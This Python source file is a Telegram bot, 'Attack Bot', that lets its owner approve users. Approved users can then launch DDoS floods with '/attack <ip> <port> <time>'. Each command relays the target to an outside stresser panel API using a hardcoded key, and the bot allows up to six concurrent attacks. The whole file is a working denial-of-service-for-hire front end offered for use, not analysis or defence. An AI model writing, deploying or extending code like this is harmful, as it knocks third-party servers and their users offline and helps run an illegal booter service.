import asyncio
import os
import httpx
from pyrogram import Client, filters
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
API_ID = 1234567         
API_HASH = "your_api_hash_here" 
OWNER_ID = 123456789  
DB_FILE = "approved_users.txt"
active_attacks = 0
app = Client("attack_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
def load_approved_users():
    if not os.path.exists(DB_FILE):
        return set()
    with open(DB_FILE, "r") as f:
        return {int(line.strip()) for line in f if line.strip().isdigit()}
def save_approved_user(user_id):
    users = load_approved_users()
    if user_id not in users:
        with open(DB_FILE, "a") as f:
            f.write(f"{user_id}\n")
def remove_approved_user(user_id):
    users = load_approved_users()
    if user_id in users:
        users.remove(user_id)
        with open(DB_FILE, "w") as f:
            for uid in users:
                f.write(f"{uid}\n")
async def extract_user(client, message):
    args = message.text.split()
    if message.reply_to_message:
        return message.reply_to_message.from_user
    elif len(args) > 1:
        user_input = args[1]
        if user_input.isdigit():
            user_id = int(user_input)
        else:
            user_id = user_input.replace("@", "")
        try:
            return await client.get_users(user_id)
        except Exception:
            return None
    return None
@app.on_message(filters.command(["start", "help"], ["!", "/", "."]))
async def start_help_cmd(client, message):
    user_id = message.from_user.id
    approved_list = load_approved_users()
    
    status = "🔴 Not Approved"
    if user_id == OWNER_ID or user_id in approved_list:
        status = "🟢 Approved"
    help_text = (
        f"👋 **Welcome to Attack Bot**\n\n"
        f"👤 **Your Profile:**\n"
        f"• Name: {message.from_user.first_name}\n"
        f"• ID: `{user_id}`\n"
        f"• Status: {status}\n\n"
        f"🚀 **Commands Available:**\n"
        f"• `/attack <ip> <port> <time>` - Launch attack (Max 6 concurrent)\n"
        f"• `/start` or `/help` - Show this menu\n"
    )
    
    if user_id == OWNER_ID:
        help_text += (
            f"\n👑 **Owner Commands:**\n"
            f"• `/approve <reply/id/username>` - Approve a user\n"
            f"• `/remove <reply/id/username>` - Remove a user\n"
            f"• `/approved` - View list of approved users\n"
        )
        
    await message.reply(help_text)
@app.on_message(filters.command(["approve"], ["!", "/", "."]))
async def approve_user(client, message):
    if message.from_user.id != OWNER_ID:
        return
    
    target = await extract_user(client, message)
    if not target:
        await message.reply("Provide a valid User ID, Username, or reply to their message.")
        return
        
    save_approved_user(target.id)
    mention = f"@{target.username}" if target.username else target.first_name
    await message.reply(f"✅ Approved: {mention} (`{target.id}`)")
@app.on_message(filters.command(["remove"], ["!", "/", "."]))
async def remove_user(client, message):
    if message.from_user.id != OWNER_ID:
        return
    
    target = await extract_user(client, message)
    if not target:
        await message.reply("Provide a valid User ID, Username, or reply to their message.")
        return
        
    remove_approved_user(target.id)
    mention = f"@{target.username}" if target.username else target.first_name
    await message.reply(f"❌ Removed: {mention} (`{target.id}`)")
@app.on_message(filters.command(["approved"], ["!", "/", "."]))
async def list_approved(client, message):
    if message.from_user.id != OWNER_ID:
        return
    
    users = load_approved_users()
    if not users:
        await message.reply("No approved users found.")
        return
    
    output = "📋 **Approved Users List:**\n\n"
    for uid in users:
        try:
            target = await client.get_users(uid)
            mention = f"@{target.username}" if target.username else target.first_name
            output += f"• {mention} (`{uid}`)\n"
        except Exception:
            output += f"• User (`{uid}`)\n"
            
    await message.reply(output)
@app.on_message(filters.command(["attack", "ddos"], ["!", "/", "."]))
async def test_cmd(client, message):
    global active_attacks
    user_id = message.from_user.id
    approved_list = load_approved_users()
    if user_id != OWNER_ID and user_id not in approved_list:
        await message.reply("❌ You are not approved by the owner to use this command.")
        return
    args = message.text.split()
    if len(args) != 4:
        await message.reply("Usage: /attack ip port time")
        return
    if active_attacks >= 6:
        await message.reply("⏳ Max concurrent attacks reached (6/6). Please wait for a slot to free up.")
        return
    active_attacks += 1
    current_concurrent = active_attacks
    
    host = args[1]
    port = args[2]
    duration = args[3]
    api_key = "7BJFcmZ4Zg2GhrWK"
    
    status_msg = await message.reply("🚀 Processing request...")
    try:
        attack_time = int(duration)
        async with httpx.AsyncClient() as client_http:
            response = await client_http.post(
                "https://api.susstresser.com/panel/api/api.php", 
                params={
                    "key": api_key,
                    "host": host,
                    "port": port,
                    "time": duration,
                    "method": "telegram",
                    "concurrent": str(current_concurrent)
                },
                timeout=15.0
            )
        
        success_output = (
            "✅ **Sent**\n\n"
            f"**Host:** {host}\n"
            f"**Port:** {port} · **Time:** {duration}s · **Method:** telegram\n"
            f"**Concurrent:** {current_concurrent}/6"
        )
        await status_msg.edit_text(success_output)
        await asyncio.sleep(attack_time)
        
    except ValueError:
        await status_msg.edit_text("❌ Invalid time duration provided.")
    except Exception:
        await status_msg.edit_text("❌ Request failed or connection timed out.")
    finally:
        active_attacks = max(0, active_attacks - 1)
if __name__ == "__main__":
    app.run()
